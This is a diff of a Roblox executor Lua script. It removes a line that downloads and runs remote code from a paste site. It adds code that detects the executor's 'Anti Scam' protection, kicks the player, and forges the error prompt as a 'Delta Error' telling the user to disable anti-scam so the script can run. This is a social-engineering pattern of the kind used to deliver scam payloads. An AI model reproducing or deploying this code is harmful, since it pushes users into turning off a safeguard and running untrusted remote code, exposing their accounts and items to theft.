@@ -1,4 +1,29 @@
-loadstring(game:HttpGet('https://dpaste.com/BUZ2KLZWU'))()
+for i, v in pairs(gethui():GetDescendants()) do
+    if v:IsA("GuiButton") then
+        if string.find(v:GetFullName(), "Settings.Holder.SettingSwitchOn.Switch") then
+            --warn(v.Parent.Title.Text)
+            if v.Parent.Title.Text == "Anti Scam" then
+                game:GetService("CoreGui").RobloxPromptGui.promptOverlay.DescendantAdded:connect(function(v)
+                    if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
+                        if v.Name == "ErrorMessage" then
+                            v.Text = "Please disable antiscam for the script to run."
+                            v:GetPropertyChangedSignal("Text"):connect(function() v.Text = "Please disable antiscam for the script to run." end)
+                        elseif v.Name == "ErrorTitle" then
+                            v.Text = "Delta Error"
+                            v:GetPropertyChangedSignal("Text"):connect(function() v.Text = "Delta Error" end)
+                        elseif v.Name == "ButtonText" then
+                            v.Text = "Bye"
+                            v:GetPropertyChangedSignal("Text"):connect(function() v.Text = "Bye" end)
+                        end
+                    end
+                end)
+                game.Players.LocalPlayer:kick("")
+            end
+        end
+    end
+end
+warn("no anti scam")
+
 
 -- DONT TOUCH THIS PART
 local Version = "1.6.31"
